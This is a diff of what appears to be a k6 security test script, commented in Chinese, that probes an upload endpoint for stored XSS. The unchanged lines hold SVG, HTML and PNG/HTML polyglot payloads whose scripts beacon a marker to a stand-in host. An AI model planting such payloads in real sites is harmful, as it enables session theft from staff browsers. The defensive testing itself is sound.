@@ -16,7 +16,7 @@
  *   🟡 仅内容嗅探可执行(缺 nosniff)  → 中危
  *   🟢 被拒 / 以图片类型返回 / 强制下载 → 通过
  *
- * 运行：k6 run -e TENANT_ID=3004 2_stored_xss.test.js
+ * 运行：k6p -e TENANT_ID=3004 2_stored_xss.test.js
  */
 import { sleep } from 'k6';
 import { getSafeEnv, classifyOrigin, absoluteUrl, tenantId } from './lib/env.js';
@@ -37,12 +37,14 @@ function payloads(run) {
     const svg = `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="120" height="60"><script>/*${mark}*/new Image().src='https://example.invalid/b?x=${mark}'</script><rect width="120" height="60" fill="#39c"/></svg>`;
     const html = `<!doctype html><html><body>${mark}<script>/*${mark}*/new Image().src='https://example.invalid/b?x=${mark}'</script></body></html>`;
     const polyHtml = appendAscii(BASE_PNG, `\n<!--${mark}--><script>/*${mark}*/new Image().src='https://example.invalid/b?x=${mark}'</script>`);
-    return { mark, list: [
-        { desc: 'SVG内嵌脚本（对照，应被拒）',      content: svg,      fileName: `k6st_${run}.svg`,       contentType: 'image/svg+xml' },
-        { desc: 'PNG+HTML polyglot 文件名.html',   content: polyHtml, fileName: `k6st_${run}p.html`,     contentType: 'text/html' },
-        { desc: '合法PNG 文件名.html（扩展名保留）', content: BASE_PNG, fileName: `k6st_${run}.html`,      contentType: 'text/html' },
-        { desc: '纯HTML文本（对照，应被拒）',        content: html,     fileName: `k6st_${run}b.html`,    contentType: 'text/html' },
-    ] };
+    return {
+        mark, list: [
+            { desc: 'SVG内嵌脚本（对照，应被拒）', content: svg, fileName: `k6st_${run}.svg`, contentType: 'image/svg+xml' },
+            { desc: 'PNG+HTML polyglot 文件名.html', content: polyHtml, fileName: `k6st_${run}p.html`, contentType: 'text/html' },
+            { desc: '合法PNG 文件名.html（扩展名保留）', content: BASE_PNG, fileName: `k6st_${run}.html`, contentType: 'text/html' },
+            { desc: '纯HTML文本（对照，应被拒）', content: html, fileName: `k6st_${run}b.html`, contentType: 'text/html' },
+        ]
+    };
 }
 
 function analyze(fb, mark) {
@@ -103,9 +105,9 @@ export function runCase(env, token) {
         risk: worst,
         conclusion:
             worst === RISK.CRITICAL ? '脚本文件与后台同源内联渲染，客服点开即被窃取会话，严重存储型 XSS。'
-            : worst === RISK.HIGH ? '脚本文件被内联渲染并原样执行，客服点开触发存储型 XSS。'
-            : worst === RISK.MEDIUM ? '存在内容嗅探型 XSS 风险（缺少 nosniff）。'
-            : '前台强制真实图片校验、以 image/* 类型从独立域返回，未发现可被客服浏览器执行的存储型 XSS。',
+                : worst === RISK.HIGH ? '脚本文件被内联渲染并原样执行，客服点开触发存储型 XSS。'
+                    : worst === RISK.MEDIUM ? '存在内容嗅探型 XSS 风险（缺少 nosniff）。'
+                        : '前台强制真实图片校验、以 image/* 类型从独立域返回，未发现可被客服浏览器执行的存储型 XSS。',
         evidence,
         recommendation: hitRecommend || '保持：拒绝非图片、以 image/* 返回、独立沙箱域托管；可再加 Content-Disposition: attachment 与 nosniff 兜底。',
     };
